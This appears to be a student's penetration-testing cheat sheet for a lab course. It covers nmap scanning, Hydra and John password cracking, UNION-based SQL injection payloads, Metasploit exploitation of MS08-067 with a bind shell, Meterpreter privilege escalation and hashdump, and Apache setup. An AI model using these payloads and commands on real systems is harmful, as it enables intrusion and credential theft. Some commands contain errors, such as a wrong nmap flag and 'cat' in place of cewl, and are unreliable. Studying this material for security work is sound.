# Table of Contents

 1. Scanning
 2. Exploits 
 3. Command Injection
 4. Password Cracking
 5. Web Application Testing
 6. Database Attacks
 7. Metasploit
 8. Apache Configuration

### Scanning
#### nmap
You can identify online hosts and services using **nmap**.

*notes*:
- View [Cheat Sheet](https://www.stationx.net/nmap-cheat-sheet) for greater resources.

*flags*:

-sV gather service/version

-sC	perform default scripts

-O	perform os detection

-p 	ports

-p- all ports 

https://highon.coffee/blog/nmap-cheat-sheet/

**example:**

    nmap -p- -sC -SV 10.10.10.193

### Exploits 

#### Server-side
##### Windows 
 - MS 03-026
 - MS 04-011
 - MS 08-067 (CVE-2008-4250)
 - MS 17-010 (CVE-2017-0144)
##### OpenSSL
- MS 03-026


## Command Injection

    perl -MURI::Escape -le 'print uri_escape shift' '|ls -l test.cgi'


## Password Cracking

### Wordlists
You can manipulate wordlists to fit policy using **pw-inspector**.

*flags*:

-i		input file

-o	output file

-m	minimum length

-M 	maximum length

-c minimum number of the following policy criteria 

-l lowercase

-u uppercase

-n numeric

-p printable character

-s special character

**example:**

    cat rockyou.txt | pw-inspector -m 10 -n -u -l -p 3 -c3

 You can generate wordlists from web pages using **cwel**
*flags*:

-d depth

-m	minimum length

-w 	maximum length

**example:**

    cat --d 0 - m3 -w testwords.txt http://thecyberacademy.org


### Online Password Guessing 

#### Hydra
You can crack passwords online using **Hyrdra** (or Gui version **xHydra**).

*notes*:
- Hydra uses 16 threads default.
- View [*Step 7*](https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/) to see how to do login forms.
- View [*Github*](https://github.com/vanhauser-thc/thc-hydra) page for more detailed instructions (may be too new).
- View *[Kali Tools](https://tools.kali.org/password-attacks/hydra)* page for man page like details.
- View *[Blog post](https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/)* for further detailed examples.

*flags*:
-l		singular username
-L	 username file
-P	password file
-t	threads

**example:**

    hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 ssh 

## Password  Attacks

### Offline Password Guessing
#### John The Ripper
You can crack passwords offline using  **John The Ripper**.

*notes*:
 - View the *[Cheat Sheet](https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf)* for extra resources.

*flags*:
--show	shows cracked password (.pot file is not used)

**example:**
`john --show example1.sam`

## Web Application Testing

### Scanning for Vulnerabilities

#### Nikto
You can use **Nikto** to perform an advance scan of a web server.

*flags*:

-host		host obviously

**example:**

    nikto -host 192.168.1.5

### Finding Content
#### DirBuster
You can use **DirBuster** to perform a brute-force attack to identify.

*note*:
use the *directory-list-small* wordlist.

### Intercepting Proxy

#### Burpsuite
You can use **Burpsuite** to perform an advance scan of a web server.

*note*:
You must enable *Manual Proxy Configuration* on Iceweasel via *Edit>Preferences and select Advanced and Network*. Then when navigating you must click *FORWARD* on proxy menu of *burpsuite*. 

*instructions*:
To finish

## Database Attacks
### SQL injection
You can inject commands into database queries.

*notes*:
- View [*Cheat Sheet*](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) for extra resources.
- View [*Cheat Sheet 2*](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) for far more resources.

#### All Seeing Eye
Use this to return all.

`OR 1=1 `

#### Determine the Number of Columns
Iterate UNION SELECT NULLs until achieved.

`' UNION SELECT NULL, NULL, NULL, NULL --%20` 

#### Determine the Table Name
Iterate Table name until achieved.

`' UNION SELECT NULL, NULL, NULL, NULL from [TABLENAME] --%20` 

#### Determine the Column Name
Alter one NULL to Iterate Column name until achieved.

`' UNION SELECT [COLUMN], NULL, NULL, NULL from [TABLENAME] --%20` 

#### Determine the Database Name
Alter one NULL to database() function.

`' UNION SELECT database(), NULL, NULL, NULL --%20`

### Determine the User Name
Alter one NULL to user() function.

`' UNION SELECT user(), NULL, NULL, NULL --%20`

## Metasploit

### Using Metasploit
*notes*:
 - View the *[Cheat Sheet ](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)* for extra resources.

#### Starting Metasploit
On command line ...

**example:**

`service postgresql start` 

`service metasploit start`

#### Launch Metasploit
On command line ...

**example:**

`msfconsole` 

#### Searching Metasploit
Within Metasploit...

**example:**

`search type:auxillary` 

#### Scanning with Metasploit
Within Metasploit...

**examples:**

`use auxiliary/scanner/...` 

`use auxiliary/scanner/smb/smb_version`

#### Exploits with Metasploit
Within Metasploit...

**examples:**

`use exploit/windows/...` 

`use exploit/windows/smb/ms08_067_netapi`

#### Payloads with Metasploit
Within Metasploit after setting exploit...

**examples:**

`set PAYLOAD windows/...` 

`set PAYLOAD windows/shell_bind_tcp`

Remember to set all needed variables. Use this command to see variables needed: 

`show options`

#### Pushing the Red Button with Metasploit
Within Metasploit...

**examples:**

`exploit` 

### Using Meterpreter
If **Meterpreter payload** is used, you have access to more commands which may come in useful. 

*notes*:
 - View the *[Cheat Sheet ]((https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md))* for extra resources.

#### Determining User
Within Meterpreter Shell...

**examples:**

`getuid` 

#### Privilege Escalation
Within Meterpreter Shell and you are not system/root...

**examples:**

`getsystem` 

#### List Running Processes
Within Meterpreter Shell...
**examples:**

`ps` 

#### Migrate Processes
Within Meterpreter Shell and you wish to migrate process for persistence...
**examples:**

`migrate [PID]` 

`migrate 770` 

#### Obtain Passwords
Within Meterpreter Shell...

**examples:**

`hashdump` 


## Apache Configuration
*notes*:
 - View the *[Cheat Sheet ](http://www.cheat-sheets.org/saved-copy/apache-refcard-a4.pdf)* for extra resources.
- View the second *[Cheat Sheet](https://www.petefreitag.com/cheatsheets/apache/)* for less extra information.


### Basics
#### Starting Apache
On command line ...
**example:**
`service apache2 start` 
`service metasploit start`

#### Reload Apache
Must be performed to commit any configuration alterations.
**example:**
`service apache2 reload` 

#### Searching Metasploit
Within Metasploit...
**example:**
`search type:auxillary` 

### Configurations
#### User Directories
Translation from  /~dave/hello.html to /home/dave/public_html/hello.html

**example:**
`a2enmod userdir` 
Remember to restart!

##### Create a User
create an apache user

**example:**
`adduser dave` 
Remember switch user using `su - dave`
Remember log out of current user using `ctrl+d`

##### Create a public_html directory
create a directory

**example:**
`mkdir public_html` 
Remember to set permissions! 
Directories should be executable and files must be readable by others. 
`chmod 701 /home/dave /home/dave/public_html`
`chmod o+r /home/dave/public_html/hello.html`

##### Accessing
Use the URL

http://[Hostname]/~dave/hello.html

#### Virtual Hosts
LinuxZoo is terrible at explaining this so here is the commands to do...

 - Create a file called "mysite" in "/etc/apache2/sites-available/". Put your virtual host definition into that file.
	 - Using the <VirtualHost> tags in this mysite file (add them into the file) create two VirtualHosts. Remember this file is "/etc/apache2/sites-available/mysite"
	 - Once the file exists you need to activate it using `a2ensite mysite`. Remember to reload your apache2 service after enabling the site
 - Your machine is known by this name in DNS. It is also known by two other names, where the word "host" has been replaced with "web" and "vm". In this example of host-3-2, this machine is also known as: `web-3-2.linuxzoo.net` and `vm-3-2.linuxzoo.net`
 - Create a virtual host entry for web and vm
	 - Something like this (remove __ but keep indent):
`<VirtualHost *:80>`
`__ServerAdmin me@jamie.org`
`__DocumentRoot /home/dave/public_html/web/`
`__ServerName web-5-97.linuxzoo.net`
` </VirtualHost>`

##### Checking syntax
Use this command!

`apache2ctl -t`

#### Basic Authentication
Honestly, LinuxZoo is horrendous here... [just look at Question 7 onwards](https://linuxzoo.net/page/kali_wk8a.html)
